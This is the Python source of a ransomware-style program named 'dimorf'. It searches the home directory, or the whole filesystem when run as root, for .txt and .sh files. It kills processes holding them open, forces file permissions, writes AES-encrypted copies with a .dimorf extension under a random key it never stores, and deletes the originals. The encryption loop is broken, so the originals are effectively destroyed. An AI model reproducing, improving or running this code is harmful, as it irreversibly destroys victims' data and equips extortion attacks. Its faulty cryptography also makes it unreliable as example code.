#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# pylint: skip-file


__author__ = 'Wendel Ortiz -> aKa Ort0x36'
__maintainer__ = 'Wendel Ortiz'
__credits__ = ['Contributors']
__module__ = 'dimorf.py'


import sys
import os
from psutil import process_iter
from time import sleep
from Crypto.Cipher import AES
from Crypto import Random


def check_os(osname: str) -> bool:
    """ Check if the specified operating system is supported.

    Args:
    osname -- the name of the operating system (string)

    Returns:
    True if the operating system is supported, False otherwise (boolean)

    Raises:
    This function may raise a SystemExit exception if the Python version is not supported.
    """

    PATH = os.getenv('HOME')
    
    if (os.getuid() == 0):
        PATH = '/'
    
    # # check if os is linux.
    is_linux = [
        prop for prop in os.uname() if (
            (prop == "Linux")
        ) and ((sys.platform == "linux")) and (
            (os.name == osname)
        )
    ]

    # # check python version before called function.
    if ((is_linux) and (
        sys.version[0] == '3')
    ):
        find_and_encrypt(
            path=PATH,
            ext_files=['.txt', '.sh'],
            cd=['/bin', '/sbin', '/etc', '/lib', '/usr/lib', '/boot'],
            hidden='.',
            new_ext='.dimorf',
            key=Random.get_random_bytes(32),
            block_bytes=65536
        )
        
        return True
    
    else:
        sys.exit(f'\33[31mUnsupported python version {sys.version_info}, upgrade to python3.\33[0m')
    

def find_and_encrypt(
    path: str,
    ext_files: list,
    cd: list,
    hidden: str,
    new_ext: str,
    key: bytes,
    block_bytes: int
) -> None:
    """
    Recursively searches for files with the specified extensions in the specified path and its subdirectories,
    encrypts them using the AES-CBC algorithm with the specified key and saves them with a new extension.
    Files with the specified names to be hidden are skipped.
    
    Args:
        path (str): The directory path to start the search from.
        ext_files (list): A list of file extensions to be encrypted.
        cd (list): A list of directory names to exclude from the search.
        hidden (str): A string containing the name of files to be hidden.
        new_ext (str): A string with the new extension to be added to the encrypted files.
        key (bytes): The encryption key as bytes.
        block_bytes (int): The size of the block in bytes that the file will be read in, and also the size of the encryption block.
    """

    # # go in search of the file.
    for root, dirs, files in os.walk(path):
        if (
            not (
                root.startswith(
                    cd[0]
                )
            ) and not (
                root.startswith(
                    cd[1]
                )
            ) and not (
                root.startswith(
                    cd[2]
                )
            ) and not (
                root.startswith(
                    cd[3]
                )
            ) and not (
                root.startswith(
                    cd[4]
                )
            ) and not (
                root.startswith(
                    cd[5]
                )
            )
        ):
            
            for file in files:
                end_with_ext = [
                    ext for ext in ext_files if (
                        file.endswith(
                            ext
                        )
                    )
                ]

                # # verify file type.
                if ((end_with_ext) and not(
                    file.startswith(
                        hidden
                    )
                )):
                    
                    # # checks if the user has permission on the file.
                    if (
                        os.access(
                            os.path.join(
                                root,
                                file
                            ), os.F_OK
                        ) and (
                            os.access(
                                os.path.join(
                                    root,
                                    file
                                ), os.W_OK
                            )
                        ) and (
                            os.access(
                                os.path.join(
                                    root,
                                    file
                                ), os.R_OK
                            )
                        )
                    ):
                        for proc in process_iter():
                            try:
                                if proc.open_files():
                                    for f in proc.open_files():
                                        if f.path == os.path.join(
                                            root,
                                            file
                                        ):
                                            os.kill(proc.pid, 9)
                            except Exception:
                                pass
                        
                        
                        # # beginning encrypt operations.
                        init_vector = Random.new().read(16)
                        cipher = AES.new(
                            key,
                            AES.MODE_CBC,
                            init_vector
                        )
                        
                        try:
                            # # open and reads file in blocks of 65536 bytes.    
                            with open(os.path.join(root, file), mode='rb') as f:
                                while True:
                                    data = f.read(
                                        block_bytes
                                    )

                                    # # add padding
                                    if len(data) == 0:
                                        data += b'\x00\x01' * (
                                            16 - (
                                                len(
                                                    data
                                                ) % 16
                                            )
                                        )
                                        break
                                    else:
                                        pass

                            # # creates a new one with the same encrypted information
                            # # and adds the modified extension ".dimorf".
                            with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
                                f.write(
                                    cipher.encrypt(
                                        data
                                    )
                                )
                            
                            # # remove the original file.
                            os.remove(
                                os.path.join(
                                    root,
                                    file
                                )
                            )
                                                
                        except PermissionError:
                            pass
                    
                    else:
                        try:
                            # # don't have? try assign.
                            os.chmod(
                                os.path.join(
                                    root, 
                                    file
                                ), 0o644
                            )
                            
                            try:
                                # # beginning encrypt operations.
                                init_vector = Random.new().read(16)
                                cipher = AES.new(
                                    key,
                                    AES.MODE_CBC,
                                    init_vector
                                )
                                
                                # # open and reads file in blocks of 65536 bytes.    
                                with open(os.path.join(root, file), mode='rb') as f:
                                    while True:
                                        data = f.read(
                                            block_bytes
                                        )

                                        # # add padding
                                        if len(data) == 0:
                                            data += b'\x00\x01' * (
                                                16 - (
                                                    len(
                                                        data
                                                    ) % 16
                                                )
                                            )
                                            break
                                        else:
                                            pass
                                    
                                # # creates a new one with the same encrypted information
                                # # and adds the modified extension ".dimorf".
                                with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
                                    f.write(
                                        cipher.encrypt(
                                            data
                                        )
                                    )
                                                        
                                # # remove the original file.
                                os.remove(
                                    os.path.join(
                                        root,
                                        file
                                    )
                                )
                            
                            except PermissionError:
                                pass
                        
                        except PermissionError:
                            
                            # # generates a log file with the files
                            # # that could not be assigned permission.
                            sleep(2)
                            logs = [
                                ('Error changing file permissions\n'),
                                (f'Files not encrypted by unauthorized operations. => {os.path.join(root, file)}\n')
                            ]

                            with open('log_dimorf.log', mode='w') as lf:
                                if lf.write(
                                    logs [
                                        0
                                    ]
                                ):
                                    lf.write(
                                        logs [
                                            1
                                        ]
                                    )
                                    print(f'\33[32mLogs generated in -> {lf}\33[0m')
                            
if __name__ == '__main__':
    os.system('clear')        
    check_os('posix')
